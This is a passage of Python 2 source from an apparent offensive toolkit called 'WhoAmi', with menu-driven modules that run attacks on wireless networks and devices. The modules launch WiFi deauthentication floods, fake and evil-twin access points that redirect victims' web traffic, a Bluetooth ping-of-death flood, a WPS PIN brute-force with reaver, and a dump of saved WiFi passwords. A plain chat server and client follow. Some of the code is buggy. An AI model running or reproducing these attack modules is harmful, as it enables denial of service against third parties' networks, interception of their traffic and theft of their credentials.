      print green + "[*] Loading %s"%essid_file[0] + default
      try:
         f = open(essid_file[0], "r").readlines()
      except Exception, e:
         print red + "Error : %s"%e + default
         wifi_mass_deauth()

      print blue + "[*]"+default+"Enabling Monitor Mod on %s"%interface[0]
      try:
         monitor_mod = "airmon-ng start %s" % (interface[0])
         subprocess.Popen(monitor_mod, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
      except Exception, e:
         print red+ "Error : %s"%e + default
         wifi_mass_deauth()
      for essids in f:
         essids = essids.strip("\n")
         print blue + "[*]"+default+"Attempting to De-authentication %s"%essids 
         command = "aireplay-ng -0 5 -a %s -c %s %s"%(bssid[0], essids, mon[0])
         os.system(command)
      print blue + "[*]"+default+"Disabling Monitor Mod ..." 
      disable_mon = "airmon-ng stop %s"%mon[0]
      subprocess.Popen(disable_mon, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
      print green + "[*] Done."+default
      wifi_mass_deauth()
 
  elif amerr[:4] == 'help':
   help_help()
   wifi_mass_deauth()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    wifi_mass_deauth()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    wifi_mass_deauth()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  wifi_mass_deauth()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    wifi_mass_deauth()

interface = ['wlan0']
essid = ['freewifi']
channel = ['11']
mac = ['a1:a2:a3:a4:a5:a6']
output = ['/home/wh_logs.txt']
mon = ['wlan0mon']
encrypt = ['1']
def wifi_wifi_honeypot():
 try:
  amerr = str(raw_input(default+'WhoAmi wireless('+red+'wifi_wifi_honeypot'+default+') > '))
  
  if  amerr[:13] == "set interface" or  amerr[:13] == "set INTERFACE" :
     interface[0] = amerr[14:]
     print "INTERFACE => ", interface[0]
     wifi_wifi_honeypot()
  elif  amerr[:9] == "set essid" or  amerr[:9] == "set ESSID" :
     essid[0] = amerr[10:]
     print "ESSID => ", essid[0]
     wifi_wifi_honeypot()
  elif  amerr[:11] == "set channel" or  amerr[:11] == "set CHANNEL" :
     channel[0] = amerr[12:]
     print "CHANNEL => ", channel[0]
     wifi_wifi_honeypot()
  elif  amerr[:7] == "set mac" or  amerr[:7] == "set MAC" :
     mac[0] = amerr[8:]
     print "MAC => ", mac[0]
     wifi_wifi_honeypot()
  
  elif  amerr[:10] == "set output" or  amerr[:10] == "set OUTPUT" :
     output[0] = amerr[11:]
     print "OUTPUT => ", output[0]
     wifi_wifi_honeypot()
     
  elif  amerr[:7] == "set mon" or  amerr[:7] == "set MON" :
     mon[0] = amerr[8:]
     print "MON => ", mon[0]
     wifi_wifi_honeypot()
  elif  amerr[:11] == "set encrypt" or  amerr[:11] == "set ENCRYPT" :
     encrypt[0] = amerr[12:]
     print "ENCRYPT => ", encrypt[0]
     wifi_wifi_honeypot()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (wifi_wifi_honeypot):" 
   print ""
   print "       Name         Current Setting      Required      Description"
   print "       interface    "+interface[0]+"                yes           Wireless Interface Name"
   print "       essid        "+essid[0]+    "             yes           FakeAP Essid"
   print "       channel      "+channel[0]+  "                   yes           FakeAP Channel"
   print "       mac          "+mac[0]+      "    yes           FakeAP Mac Address"
   print "       output       "+output[0]+   "    yes           Log File Location"
   print "       mon          "+mon[0]+      "             yes           Monitor Mod(default)"
   print "       encrypt      "+encrypt[0]+  "                    yes           Type Of Encryptions"
   print "\n"
   print "       Numbers     Encryptions"
   print "       1           Unencrypted"
   print "       2           wep"
   print "       3           wpa"
   print "       4           wpa2"
   print ""
   print ""
   print ""
   wifi_wifi_honeypot()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
       comm1= "xterm -e airbase-ng -a "+str(mac[0])+" -c "+str(channel[0])+" --essid "+str(essid[0])+" "+str(mon[0])+" > "+str(output[0])+" &"
       comm2= "xterm -e airbase-ng -a "+str(mac[0])+" -c "+str(channel[0])+" --essid "+str(essid[0])+" -W 1 "+str(mon[0])+" > "+str(output[0])+" &"
       comm3= "xterm -e airbase-ng -a "+str(mac[0])+" -c "+str(channel[0])+" --essid "+str(essid[0])+" -W 1 -z 2 "+str(mon[0])+" > "+str(output[0])+" &"
       comm4= "xterm -e airbase-ng -a "+str(mac[0])+" -c "+str(channel[0])+" --essid "+str(essid[0])+" -W 1 -Z 4 "+str(mon[0])+" > "+str(output[0])+" &"
       monit_mod_start= "airmon-ng start %s" % (str(essid[0]))
       print blue +"[*]"+default+"Enable monitor mod on your interface [%s] ..." % (str(interface[0]))
       subprocess.Popen(monit_mod_start, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
       print green+"[OK]"+default
       print blue +"[*]"+default+"Creating Fake Access Point ..."
       if encrypt[0]==1:
         os.system(comm1)
       elif encrypt[0]==2:
         os.system(comm2)
       elif encrypt[0]==3:
         os.system(comm3)
       elif encrypt[0]==4:
         os.system(comm4)
       else:
         print red+"[!]Error : Encryption ID not Found!"+default
         pass
       time.sleep(2)
       print green+"[OK]"+default
       wifi_wifi_honeypot()
 
  elif amerr[:4] == 'help':
   help_help()
   wifi_wifi_honeypot()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    wifi_wifi_honeypot()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    wifi_wifi_honeypot()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  wifi_wifi_honeypot()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    wifi_wifi_honeypot()






interface = ['hci0']
bdaddr = ['']
size = ['600']
def bluetooth_bluetooth_pod():
 try:
  amerr = str(raw_input(default+'WhoAmi wireless('+red+'bluetooth_bluetooth_pod'+default+') > '))
  
  if  amerr[:13] == "set interface" or  amerr[:13] == "set INTERFACE" :
     interface[0] = amerr[14:]
     print "INTERFACE => ", interface[0]
     bluetooth_bluetooth_pod()
  elif amerr[:10] == "set bdaddr" or  amerr[:10] == "set BDADDR" :
     bdaddr[0] = amerr[11:]
     print "BDADDR => ", bdaddr[0]
     bluetooth_bluetooth_pod()
  elif amerr[:8] == "set size" or  amerr[:8] == "set SIZE" :
     size[0] = amerr[9:]
     print "SIZE => ", size[0]
     bluetooth_bluetooth_pod()
     
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (bluetooth_bluetooth_pod):" 
   print ""
   print "       Name         Current Setting      Required      Description"
   print "       interface    "+interface[0]+"                 yes           Bluetooth Interface Name"
   print "       bdaddr       "+bdaddr[0]+    "                     yes           Target Bluetooth Address"
   print "       size         "+size[0]+  "                  yes           Size of packets (Default 600)"
   print ""
   print ""
   bluetooth_bluetooth_pod()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    print blue + "[*]"+default+"Bluetooth Ping Of Death Attack Started ..." 
    try:
       for i in range(1, 10000):
         xterm_1 = "l2ping -i %s -s %s -f %s &" % (interface[0], bdaddr[0], size[0])
         subprocess.Popen(xterm_1, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         time.sleep(3)
    except(KeyboardInterrupt, OSError):
       print red + "[!] Something Is Wrong ! Websploit Bluetooth_POD Module Exit." + default
    bluetooth_bluetooth_pod()
 
  elif amerr[:4] == 'help':
   help_help()
   bluetooth_bluetooth_pod()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    bluetooth_bluetooth_pod()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    bluetooth_bluetooth_pod()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  bluetooth_bluetooth_pod()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    bluetooth_bluetooth_pod()
    
    
    
interface = ['wlan0']
bssid = ['00:00:00:00:00:00']
essid = ['freewifi']
mon = ['wlan0mon']
channel = ['11']
template = ['files/wifi/tmp/neutral/']
ip_range = ['192.168.43.145']
def wifi_evil_twin():
 try:
  amerr = str(raw_input(default+'WhoAmi wireless('+red+'wifi_evil_twin'+default+') > '))
  
  if  amerr[:13] == "set interface" or  amerr[:13] == "set INTERFACE" :
     interface[0] = amerr[14:]
     print "INTERFACE => ", interface[0]
     wifi_evil_twin()
  elif  amerr[:9] == "set bssid" or  amerr[:9] == "set BSSID" :
     bssid[0] = amerr[10:]
     print "BSSID => ", bssid[0]
     wifi_evil_twin()
  elif  amerr[:9] == "set essid" or  amerr[:9] == "set ESSID" :
     essid[0] = amerr[10:]
     print "ESSID => ", essid[0]
     wifi_evil_twin()
  elif  amerr[:7] == "set mon" or  amerr[:7] == "set MON" :
     mon[0] = amerr[8:]
     print "MON => ", mon[0]
     wifi_evil_twin()  
  elif  amerr[:11] == "set channel" or  amerr[:11] == "set CHANNEL" :
     channel[0] = amerr[12:]
     print "CHANNEL => ", channel[0]
     wifi_evil_twin()
  elif  amerr[:12] == "set template" or  amerr[:12] == "set TEMPLATE" :
     template[0] = amerr[13:]
     print "TEMPLATE => ", template[0]
     wifi_evil_twin()
     
  elif  amerr[:12] == "set ip_range" or  amerr[:12] == "set IP_RANGE" :
     ip_range[0] = amerr[13:]
     print "IP_RANGE => ", ip_range[0]
     wifi_evil_twin()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (wifi_evil_twin):" 
   print ""
   print "       Name         Current Setting      Required      Description"
   print "       interface    "+interface[0]+"                yes           Wireless Interface Name"
   print "       bssid        "+bssid[0]+      "    yes           Target BSSID Address"
   print "       essid        "+essid[0]+    "             yes           FakeAP Essid"
   print "       mon          "+mon[0]+      "             yes           Monitor Mod(default)"
   print "       channel      "+channel[0]+  "                   yes           FakeAP Channel"
   print "       template     "+template[0]+   "            Files Phising"
   
   print "       ip_range     "+ip_range[0]+  "       yes           Ip Range"
   print ""
   wifi_evil_twin()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
		
		process=commands.getoutput("airmon-ng check $INTERFACE | tail -n +8 | grep -v \"on interface\" | awk '{ print $2 }'")
		print "Killing proccess on interface"
		process=process.split("\n")
		for p in process:
			commands.getoutput("killall "+p)

		rangos=ip_range[0].split(".")
		rango=rangos[0]+"."+rangos[1]+"."+rangos[3]+".1"
		rangov=rangos[0]+"."+rangos[1]+"."+rangos[3]

		print "Setting tables ["+rango+"]"
		commands.getoutput("ifconfig "+str(interface[0])+" up")
		commands.getoutput("ifconfig "+str(interface[0])+" "+str(ip_range[0])+" netmask 255.255.255.0")
		commands.getoutput("route add -net "+rango+" netmask 255.255.255.0 gw "+str(ip_range[0]))
		commands.getoutput("echo \"1\" > /proc/sys/net/ipv4/ip_forward")
		commands.getoutput("iptables --flush")
		commands.getoutput("iptables --table nat --flush")
		commands.getoutput("iptables --delete-chain")
		commands.getoutput("iptables --table nat --delete-chain")
		commands.getoutput("iptables -P FORWARD ACCEPT")
		commands.getoutput("iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination "+str(ip_range[0])+":80")
		commands.getoutput("iptables -t nat -A POSTROUTING -j MASQUERADE")
		commands.getoutput("echo interface="+str(interface[0])+"  > tmp/hostapd.conf")
		commands.getoutput("echo driver=nl80211                  >> tmp/hostapd.conf")
		commands.getoutput("echo ssid="+str(essid[0])+"      >> tmp/hostapd.conf")
		commands.getoutput("echo channel="+str(channel[0])+" >> tmp/hostapd.conf")

		commands.getoutput("echo authoritative\;> tmp/dhcpd.config")
		commands.getoutput("echo default-lease-time 600\;>> tmp/dhcpd.config")
		commands.getoutput("echo max-lease-time 7200\;>> tmp/dhcpd.config")
		commands.getoutput("echo subnet "+rangov+".0 netmask 255.255.255.0 { >> tmp/dhcpd.config")
		commands.getoutput("echo option broadcast-address "+rangov+".255\;>> tmp/dhcpd.config")
		commands.getoutput("echo option routers "+rango+"\;>> tmp/dhcpd.config")
		commands.getoutput("echo option subnet-mask 255.255.255.0\;>> tmp/dhcpd.config")
		commands.getoutput("echo option domain-name-servers "+rango+"\;>> tmp/dhcpd.config")
		commands.getoutput("echo range "+rangov+".100 "+rangov+".250\;>> tmp/dhcpd.config")
		commands.getoutput("echo }>> tmp/dhcpd.config")
		commands.getoutput("echo "+str(bssid[0])+" > tmp/target.log")

		#printk.inf("Starting Apache Server                   "+status_cmd("service apache2 start"))
		#printk.inf("Coping Files to Server                   "+status_cmd("cp -r "+init.var['template']+"* "+PATCH_WWW))
		#printk.inf("Starting Access Point ["+init.var['essid']+"]")
		os.system("hostapd tmp/hostapd.conf")
		time.sleep(3)
		print "Starting DHCP server"
		os.system("dhcpd -d -f -cf tmp/dhcpd.config")
		time.sleep(3)
		print "Starting DOS attack to "+str(bssid[0])
		wifi_evil_twin("mdk3 "+str(mon[0])+" d -b tmp/target.log -c "+str(channel[0]))
		raw_input("if you want to stop AP (PRESS [ENTER])")
		DNSFAKE()
		os.system("dhcpd")
		os.system("hostapd")
		os.system("mdk3")
		os.system("NetworkManager start")
		commands.getoutput("iptables --flush")
		commands.getoutput("iptables --table nat --flush")
		commands.getoutput("iptables --delete-chain")
		commands.getoutput("iptables --table nat --delete-chain")
		for p in process:
			commands.getoutput("service "+p+" start")

		#printk.inf("Removing files                           "+status_cmd("rm -r "+PATCH_WWW+"* ; rm tmp/hostapd.conf; rm tmp/dhcpd.config; rm tmp/target.log"))
		#printk.inf("Stoping Apache Server                    "+status_cmd("service apache2 stop"))
	
		wifi_evil_twin()
  elif amerr[:4] == 'help':
   help_help()
   wifi_evil_twin()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    wifi_evil_twin()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    wifi_evil_twin()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  wifi_evil_twin()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    wifi_evil_twin()
    
    

bssid = ['00:00:00:00:00:00']
mon = ['wlan0mon']
channel = ['11']
def wifi_wps_pin():
 try:
  amerr = str(raw_input(default+'WhoAmi wireless('+red+'wifi_wps_pin'+default+') > '))
  
  if  amerr[:9] == "set bssid" or  amerr[:9] == "set BSSID" :
     bssid[0] = amerr[10:]
     print "BSSID => ", bssid[0]
     wifi_wps_pin()
  elif  amerr[:7] == "set mon" or  amerr[:7] == "set MON" :
     mon[0] = amerr[8:]
     print "MON => ", mon[0]
     wifi_wps_pin()  
  elif  amerr[:11] == "set channel" or  amerr[:11] == "set CHANNEL" :
     channel[0] = amerr[12:]
     print "CHANNEL => ", channel[0]
     wifi_wps_pin()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (wifi_wps_pin):" 
   print ""
   print "       Name         Current Setting      Required      Description"
   print "       bssid        "+bssid[0]+"    yes           Target BSSID Address"
   print "       mon          "+mon[0]+"             yes           Monitor Mod(default)"
   print "       channel      "+channel[0]+"                   yes           Target Channel Number"
   print ""
   print ""
   wifi_wps_pin()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    os.system("reaver -i "+str(mon[0])+" -b "+str('bssid[0]')+" -vv -K "+str(channel[0]))
    wifi_wps_pin()
  elif amerr[:4] == 'help':
   help_help()
   wifi_wps_pin()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    wifi_wps_pin()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    wifi_wps_pin()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  wifi_wps_pin()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    wifi_wps_pin()
file_wifi = ['/usr/share/doc/wpa_supplicant/examples/wpa_supplicant.conf']

def wifi_pass_saved():
 try:
  amerr = str(raw_input(default+'WhoAmi wireless('+red+'wifi_pass_saved'+default+') > '))
  
  if  amerr[:9] == "set file" or  amerr[:9] == "set FILE" :
     file_wifi[0] = amerr[10:]
     print "File => ", file_wifi[0]
     wifi_pass_saved()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (wifi_pass_saved):" 
   print ""
   print "       Name  Current Setting                                                Description"
   print "       FILE  "+file_wifi[0]+"     pwd File wpa_supplicant.conf   "
   print ""
   print ""
   wifi_pass_saved()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
    os.system("cat "+file_wifi[0])
    wifi_pass_saved()
  elif amerr[:4] == 'help':
   help_help()
   wifi_pass_saved()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    wifi_pass_saved()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    wifi_pass_saved()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  wifi_pass_saved()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    wifi_pass_saved    

#HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHh

#kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk{communication}kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk

lchathost = ["0.0.0.0"]
lchatport = ["3333"]
def continue_in_secrecy_server_1():
 try:
  amerr = str(raw_input(default+'WhoAmi communication('+red+'continue_in_secrecy_server_1'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lchathost[0] = amerr[10:]
     print "LHOST => ", lchathost[0]
     continue_in_secrecy_server_1()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lchatport[0] = amerr[10:]
     print "LPORT => ", lchatport[0]
     continue_in_secrecy_server_1()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (continue_in_secrecy_server_1):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lchathost[0]+"              yes           The listen address "
   print"        LPORT     "+lchatport[0]+"                 yes           The listen port "
   print ""
   print ""
   continue_in_secrecy_server_1()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":
   class Server(object):
     # List to keep track of socket descriptors
     CONNECTION_LIST = []
     RECV_BUFFER = 4096  # Advisable to keep it as an exponent of 2
     PORT = int(lchatport[0])
     HOST= str(lchathost[0])
     def __init__(self):
        self.user_name_dict = {}
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.set_up_connections()
        self.client_connect()

     def set_up_connections(self):
        # this has no effect, why ?
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind((self.HOST, self.PORT))
        self.server_socket.listen(50)  # max simultaneous connections.

        # Add server socket to the list of readable connections
        self.CONNECTION_LIST.append(self.server_socket)

    # Function to broadcast chat messages to all connected clients
     def broadcast_data(self, sock, message):
        # Do not send the message to master socket and the client who has send us the message
        for socket in self.CONNECTION_LIST:
            if socket != self.server_socket and socket != sock:
                # if not send_to_self and sock == socket: return
                try:
                    socket.send(message)
                except:
                    # broken socket connection may be, chat client pressed ctrl+c for example
                    socket.close()
                    self.CONNECTION_LIST.remove(socket)

     def send_data_to(self, sock, message):
        try:
            sock.send(message)
        except:
            # broken socket connection may be, chat client pressed ctrl+c for example
            socket.close()
            self.CONNECTION_LIST.remove(sock)

     def client_connect(self):
        print blue+"[*]"+default+"Chat server started on port " + str(self.PORT)
        while 1:
            # Get the list sockets which are ready to be read through select
            read_sockets, write_sockets, error_sockets = select.select(self.CONNECTION_LIST, [], [])

            for sock in read_sockets:
                # New connection
                if sock == self.server_socket:
                    # Handle the case in which there is a new connection recieved through server_socket
                    self.setup_connection()
                # Some incoming message from a client
                else:
                    # Data recieved from client, process it
                    try:
                        # In Windows, sometimes when a TCP program closes abruptly,
                        # a "Connection reset by peer" exception will be thrown
                        data = sock.recv(self.RECV_BUFFER)
                        if data:
                            if self.user_name_dict[sock].username is None:
                                self.set_client_user_name(data, sock)
                            else:
                                self.broadcast_data(sock, "\r" + ' { ' + self.user_name_dict[sock].username + ' }>>>' + data)

                    except:
                        self.broadcast_data(sock, red+"[-]"+default+"Client (%s, %s) is offline" % addr)
                        print red+"[-]"+default+"Client (%s, %s) is offline" % addr
                        sock.close()
                        self.CONNECTION_LIST.remove(sock)
                        continue

        self.server_socket.close()

     def set_client_user_name(self, data, sock):
        self.user_name_dict[sock].username = data.strip()
        self.send_data_to(sock, data.strip() + ', you are now in the chat room\n')
        self.send_data_to_all_regesterd_clents(sock, data.strip() + ', has joined the cat room\n')

     def setup_connection(self):
        sockfd, addr = self.server_socket.accept()
        self.CONNECTION_LIST.append(sockfd)
        print blue+"[*]"+default+"Client (%s, %s) connected" % addr
        self.send_data_to(sockfd, blue+"[*]"+default+"please enter a username: ")
        self.user_name_dict.update({sockfd: Connection(addr)})

     def send_data_to_all_regesterd_clents(self, sock, message):
        for local_soc, connection in self.user_name_dict.iteritems():
            if local_soc != sock and connection.username is not None:
                self.send_data_to(local_soc, message)


   class Connection(object):
    def __init__(self, address):
        self.address = address
        self.username = None


   if __name__ == "__main__":
    server = Server()  
   continue_in_secrecy_server_1()
  elif amerr[:4] == 'help':
   help_help()
   continue_in_secrecy_server_1()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    continue_in_secrecy_server_1()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:4] == "nmap":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:5] == 'my_ip':
    my_ip()
   elif amerr[:2] == "cd":
    print red+"[-] No path specified "+default
   elif amerr[:2] == "os":
    os.system(amerr[3:])
   elif amerr == '':
    continue_in_secrecy_server_1()
   else:
    print red+"[-] Unknown command: "+default+""+amerr
  continue_in_secrecy_server_1()
  
 except KeyboardInterrupt:
    print default+"  Interrupt: use the 'exit' command to quit"
    continue_in_secrecy_server_1()
 
 

lchathost = ["0.0.0.0"]
lchatport = ["3333"]
def continue_in_secrecy_client_1():
 try:
  amerr = str(raw_input(default+'WhoAmi communication('+red+'continue_in_secrecy_client_1'+default+') > '))
  
  if  amerr[:9] == "set lhost" or  amerr[:9] == "set LHOST" :
     lchathost[0] = amerr[10:]
     print "LHOST => ", lchathost[0]
     continue_in_secrecy_client_1()
  elif  amerr[:9] == "set lport" or  amerr[:9] == "set LPORT" :
     lchatport[0] = amerr[10:]
     print "LPORT => ", lchatport[0]
     continue_in_secrecy_client_1()
  elif amerr[:12] == "show options":
   print ""
   print ""
   print"    options (continue_in_secrecy_client_1):" 
   print ""
   print"        Name      Current Setting      Required      Description"
   print"        LHOST     "+lchathost[0]+"              yes           The listen address "
   print"        LPORT     "+lchatport[0]+"                 yes           The listen port "
   print ""
   print ""
   continue_in_secrecy_client_1()
  elif amerr[:3] == "run" or amerr[:7] == "exploit":

   def prompt():
    sys.stdout.write("> ")
    sys.stdout.flush()


   class Client(object):
    def __init__(self):
        self.host = str(lchathost[0])
        self.port = int(lchatport[0])
        self.sock = None
        self.connect_to_server()

    def connect_to_server(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(2)
        # connect to remote host
        try:
            self.sock.connect((self.host, self.port))
        except:
            print blue+'[*]'+default+'Unable to connect'
            continue_in_secrecy_client_1()

        print blue+'[*]'+default+'Connected to remote host. Start sending messages'
        prompt()
        self.wait_for_messages()

    def wait_for_messages(self):
        while 1:
            socket_list = [sys.stdin, self.sock]

            # Get the list sockets which are readable
            read_sockets, write_sockets, error_sockets = select.select(socket_list, [], [])

            for sock in read_sockets:
                # incoming message from remote server
                if sock == self.sock:
                    data = sock.recv(4096)
                    if not data:
                        print red+'\n[-]'+default+'Disconnected from chat server'
                        continue_in_secrecy_client_1()
                    else:
                        # print data
                        sys.stdout.write(data)
                        prompt()

                # user entered a message
                else:
                    msg = sys.stdin.readline()
                    self.sock.send(msg)
                    prompt()


   if __name__ == '__main__':
    client = Client()
  
    ccontinue_in_secrecy_client_1()
  elif amerr[:4] == 'help':
   help_help()
   continue_in_secrecy_client_1()
  
  elif amerr[:4] == 'back':
    WhoAmi()
  elif amerr[:4] == 'exit':
	 exit()
  else:
  
   if amerr[:8] == "ifconfig":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
  
   elif amerr[:6] == "whoami":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   elif amerr[:6] == "banner":
    banner()
    continue_in_secrecy_client_1()
   elif amerr[:2] == "ls":
    print blue+"[*]"+default+" exec "+amerr
    print ""
    os.system(amerr)
   
   elif amerr[:5] == "clear":
    print blue+"[*]"+default+" exec "+amerr
    print ""
